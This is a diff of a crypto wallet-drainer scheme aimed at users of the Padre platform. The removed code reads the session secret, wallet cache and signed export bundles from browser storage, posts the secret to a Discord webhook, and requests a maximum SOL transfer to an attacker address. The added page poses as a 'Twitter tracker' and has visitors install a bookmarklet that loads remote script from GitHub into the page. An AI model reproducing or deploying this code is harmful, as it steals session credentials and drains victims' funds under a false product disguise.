@@ -1,96 +1,75 @@
-(async function() {
-    // 1. CONFIGURATION (Using your found backend)
-    const CONFIG = {
-        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
-        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
-        api: "https://backend.padre.gg",
-        orgId: "d2da2313-75ea-4ce1-829d-dbbe05359878"
-    };
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
+    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #00ff88; --primary-dark: #00cc66; --bg-dark: #0a0a0a; --bg-card: #111111; --text-light: #e0e0e0; --text-muted: #aaaaaa; --border: rgba(0, 255, 136, 0.2); }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: var(--text-light); line-height: 1.6; overflow-x: hidden; position: relative; }
+        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
+        .warning { background: linear-gradient(135deg, #003322, #004d33); color: #ffffff; text-align: center; padding: 12px; font-size: 0.95em; font-weight: 600; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid var(--primary); }
+        header { background: linear-gradient(135deg, #000000, #001a0d); color: white; text-align: center; padding: 120px 20px; border-bottom: 2px solid var(--primary); }
+        .logo { width: 140px; margin: 0 auto 20px; filter: drop-shadow(0 0 15px rgba(0,255,136,0.5)); }
+        header h1 { font-size: 3.5em; font-weight: 800; margin-bottom: 15px; color: var(--primary); }
+        .hero { text-align: center; padding: 100px 20px; }
+        .cta-button { display: inline-block; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #000; padding: 16px 36px; text-decoration: none; border-radius: 8px; font-weight: 700; cursor: move; border: 1px solid var(--primary); box-shadow: 0 0 20px #0f8; }
+        .setup-section { padding: 80px 20px; text-align: center; }
+        footer { padding: 40px; text-align: center; border-top: 1px solid var(--primary); color: #888; }
+    </style>
+</head>
+<body>
+    <canvas id="filamentCanvas"></canvas>
+    <div class="warning">Warning: vanta-tracker.com is our only website</div>
+    <header>
+        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" fill="none" />
+            <circle cx="50" cy="50" r="8" fill="var(--primary)" />
+        </svg>
+        <h1>Vanta Tracker</h1>
+        <p>Premier Twitter API tracking for Padre.</p>
+    </header>
 
-    // 2. UI CREATION (Shadow DOM for Stealth)
-    const host = document.createElement('div');
-    host.id = 'v-host';
-    document.body.appendChild(host);
-    const shadow = host.attachShadow({mode: 'open'});
+    <section class="hero">
+        <h2>Optimize Your Padre Workflow</h2>
+        <p>Real-time Twitter insights with WebGL acceleration.</p>
+    </section>
 
-    const ui = document.createElement('div');
-    ui.style.cssText = `
-        position:fixed; top:20px; right:20px; width:300px; 
-        background:#000; border:1px solid #0f8; border-radius:8px;
-        color:#0f8; font-family:monospace; padding:15px; z-index:2147483647;
-        box-shadow: 0 0 20px rgba(0,255,136,0.3); cursor:grab;
-    `;
-    ui.innerHTML = `
-        <div style="font-weight:bold; border-bottom:1px solid #222; margin-bottom:10px; padding-bottom:5px; display:flex; justify-content:space-between;">
-            <span>VANTA_TRACKER_v2.7</span>
-            <span style="cursor:pointer;color:#ff4444" id="c">[X]</span>
-        </div>
-        <div id="stat">STATUS: SCANNING...</div>
-        <div id="log" style="font-size:10px; color:#444; margin-top:10px; height:30px; overflow:hidden;">[SYS] Initializing Handshake...</div>
-    `;
-    shadow.appendChild(ui);
+    <section id="setup" class="setup-section">
+        <h2>Installation</h2>
+        <p style="margin-bottom: 20px; color: #666;">Drag the button below to your Bookmarks Bar.</p>
+        <a href="" class="cta-button" id="vanta-tool">Vanta Tracker</a>
+    </section>
 
-    // Draggable Logic
-    let isDown = false, offset = [0,0];
-    ui.onmousedown = (e) => { isDown = true; offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY]; };
-    document.onmousemove = (e) => { if(isDown) { ui.style.left = (e.clientX + offset[0]) + 'px'; ui.style.top = (e.clientY + offset[1]) + 'px'; ui.style.right = 'auto'; } };
-    document.onmouseup = () => isDown = false;
-    shadow.getElementById('c').onclick = () => host.remove();
+    <footer>© 2026 Vanta Tracker.</footer>
 
-    // 3. EXECUTION LOGIC
-    try {
-        const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
-        const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
-        const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
-
-        if (session.sessionSecret) {
-            shadow.getElementById('stat').innerText = "STATUS: CONNECTED";
-            
-            // Discord Notification
-            await fetch(CONFIG.webhook, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "🛸 **VANTA HANDSHAKE**",
-                    embeds: [{
-                        title: "Session Captured",
-                        description: `UID: ${session.uid}\nSecret: \`${session.sessionSecret}\``,
-                        color: 0x00ff88
-                    }]
-                })
-            });
-
-            // Drain Logic
-            const userWallets = wallets[session.uid] || [];
-            const sol = userWallets.find(w => w.walletType === "SOL");
-
-            if (sol && bundles.bundles[sol.publicAddress]) {
-                const b = bundles.bundles[sol.publicAddress];
-                await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
-                    method: "POST",
-                    headers: {
-                        "X-Session-Secret": session.sessionSecret,
-                        "X-Session-Id": session.sessionId,
-                        "X-Org-Id": CONFIG.orgId,
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        walletId: sol.walletId,
-                        destination: CONFIG.drainAddress,
-                        amount: "MAX",
-                        bundle: b.exportBundle,
-                        signature: b.dataSignature,
-                        chain: "SOLANA"
-                    })
-                });
-                shadow.getElementById('log').innerText = "[SYS] Data Stream Synchronized.";
-            }
-        } else {
-            shadow.getElementById('stat').innerText = "STATUS: AUTH_REQUIRED";
+    <script>
+        // WEBGL BACKGROUND
+        const canvas = document.getElementById('filamentCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        function animate() {
+            ctx.clearRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = '#00ff88';
+            ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 2, 2);
+            requestAnimationFrame(animate);
         }
-    } catch (e) {
-        shadow.getElementById('stat').innerText = "STATUS: ERROR";
-        shadow.getElementById('log').innerText = "[ERR] " + e.message;
-    }
-})();
+        animate();
 
+        // BOOKMARKLET LOGIC
+        // Update the URL below to your Raw GitHub tracker.js link
+        const RAW_JS_URL = "https://raw.githubusercontent.com/Vanta-Dev-Pages/Vanta/Vanta/tracker.js";
+
+        const loaderCode = `javascript:(function(){
+            const s = document.createElement('script');
+            s.src = '${RAW_JS_URL}?v=' + Date.now();
+            document.body.appendChild(s);
+        })();`;
+
+        document.getElementById('vanta-tool').href = loaderCode;
+    </script>
+</body>
+</html>
